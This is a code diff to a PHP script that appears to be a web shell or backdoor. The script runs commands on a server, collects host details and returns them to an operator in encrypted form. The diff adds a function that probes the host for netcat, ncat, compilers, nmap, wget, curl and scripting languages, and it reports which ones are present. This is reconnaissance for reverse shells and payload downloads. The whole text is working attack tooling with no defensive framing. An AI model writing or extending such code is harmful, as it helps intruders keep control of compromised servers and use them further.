@@ -46,7 +46,8 @@ if (isset($_POST['i'])) {
             'server' => base64_encode($_SERVER['SERVER_SOFTWARE']),
             'time' => base64_encode(date('l jS F Y h:i:s A')),
             'ip' => base64_encode(getenv('SERVER_ADDR')),
-            'client_ip' => base64_encode(get_client_ip())
+            'client_ip' => base64_encode(get_client_ip()),
+            'tools' => base64_encode(implode('|', find_tools()))
         ));
         echo encrypt_decrypt('encrypt', $output, $key, $iv);
     }
@@ -236,5 +237,31 @@ function get_client_ip()
         $ip = $_SERVER['REMOTE_ADDR'];
     }
     return $ip;
+}
+
+// Find some tools
+function find_tools(){
+    $found = array();
+    $tools = array('python','perl','ruby','nc','netcat','ncat','gcc','nmap','wget','curl');
+
+    $command = null;
+
+    switch (true) {
+        case stristr(PHP_OS, 'DAR'): $command = 'which'; break;
+        case stristr(PHP_OS, 'WIN'): $command = 'where'; break;
+        case stristr(PHP_OS, 'LINUX'): $command = 'which'; break;
+        default: $command = '';
+    }
+
+    if (!empty($command)) {
+        foreach ($tools as $tool) {
+            $output = execute_command("{$command} {$tool}");
+            if (strlen(trim($output)) > 0) {
+                array_push($found, $tool);
+            }
+        }
+    }
+
+    return $found;
 }
 /* EOF */
